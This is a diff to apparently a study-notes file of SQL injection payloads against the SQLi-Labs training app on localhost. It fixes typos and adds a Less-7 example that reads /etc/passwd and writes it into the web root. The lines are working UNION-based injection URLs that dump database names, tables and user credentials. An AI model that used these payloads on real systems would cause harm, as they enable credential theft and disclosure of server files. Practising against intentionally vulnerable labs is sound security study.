@@ -86,7 +86,7 @@ Some examples:
 
 	http://localhost/sqlilabs/Less-1/?id=-1' union select 1,database(),user()-- - "This shows the current database name and current database user"
 
-	http://localhost/sqlilabs/Less-1/?id=-1' union select 1,group_concat(eschema_name),3 from information_schema.schemata-- - "This shows all the databases separated with ,"
+	http://localhost/sqlilabs/Less-1/?id=-1' union select 1,group_concat(eschema_name),3 from information_schema.schemata-- - "This shows all the databases separated by coma ,"
 
 	http://localhost/sqlilabs/Less-1/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()-- -
 
@@ -96,4 +96,6 @@ Some examples:
 
 	http://localhost/sqlilabs/Less-1/?id=-1' union select 1,username,password from users limit 0,1-- - "iterate over the first digit to move through the columns"
 
-	http://localhost/sqlilabs/Less-1/?id=-1' union select 1,group_concat(username,0x3a,password),3 from users-- - "this dumps all the coluns content separated with colon :"
+	http://localhost/sqlilabs/Less-1/?id=-1' union select 1,group_concat(username,0x3a,password),3 from users-- - "this dumps all the columns content separated by colon :"
+
+	http://localhost/sqlilabs/Less-7/?id=-1')) union select "",load_file('/etc/passwd'),"" into outfile '/var/www/html/sqlilabs/Less-7/dumpfile.txt'-- - "This dumps readable files"
